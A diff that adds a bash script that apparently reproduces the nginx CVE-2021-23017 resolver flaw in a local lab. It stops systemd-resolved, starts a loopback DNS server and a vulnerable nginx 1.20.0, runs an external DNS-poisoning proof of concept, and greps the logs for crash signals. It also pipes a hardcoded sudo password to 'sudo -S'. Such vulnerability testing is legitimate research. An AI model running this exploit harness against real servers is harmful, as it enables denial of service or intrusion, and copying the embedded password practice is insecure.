@@ -1,0 +1,49 @@
+#!/usr/bin/env bash
+LAB="$HOME/nginx-poc-lab"
+POCLAB="/mnt/d/download/PoClab/PoCLab"
+OUT="$LAB/23017-result.txt"
+POC="$LAB/poc23017.py"
+sud(){ echo '1' | sudo -S "$@"; }
+stop(){
+  sud pkill -f "dnsmasq.*127.0.0.100" 2>/dev/null || true
+  pkill -f "$LAB/nginx-1.20.0" 2>/dev/null || true
+  sleep 1
+}
+: >"$OUT"
+stop
+sud systemctl stop systemd-resolved 2>>"$OUT" || true
+sud ip addr add 127.0.0.100/32 dev lo 2>>"$OUT" || true
+sed 's/port 53/port 5353/g' "$POCLAB/pocs/CVE-2021-23017/poc.py" >"$POC"
+cat >"$LAB/conf/23017.conf" <<EOF
+worker_processes 1;
+error_log $LAB/23017-error.log info;
+pid $LAB/23017.pid;
+events { worker_connections 64; }
+http {
+    resolver 127.0.0.100:5353 valid=30s ipv6=off;
+    server {
+        listen 23017;
+        location / {
+            set \$u "http://resolve.test/";
+            proxy_pass \$u;
+        }
+    }
+}
+EOF
+dnsmasq --keep-in-foreground --port=5353 --listen-address=127.0.0.100 --no-hosts --no-resolv >>"$OUT" 2>&1 &
+DNSPID=$!
+sleep 1
+"$LAB/nginx-1.20.0/sbin/nginx" -c "$LAB/conf/23017.conf" 2>>"$OUT"
+sleep 1
+sud timeout 30 python3 "$POC" -t 127.0.0.1 -r 127.0.0.100 >>"$OUT" 2>&1 &
+POCPID=$!
+sleep 3
+curl -sf --max-time 5 http://127.0.0.1:23017/ >>"$OUT" 2>&1 || echo curl_done >>"$OUT"
+wait $POCPID
+POC_RC=$?
+echo "poc_exit=$POC_RC" >>"$OUT"
+grep -E "exploited|malicious answer|signal 11|alert|ERROR|Listening|DNS request|Sending poisoned" "$OUT"
+grep -E "signal 11|alert|exploited|resolver" "$LAB/23017-error.log" 2>/dev/null | tail -8 >>"$OUT"
+kill $DNSPID 2>/dev/null || true
+stop
+tail -15 "$OUT"
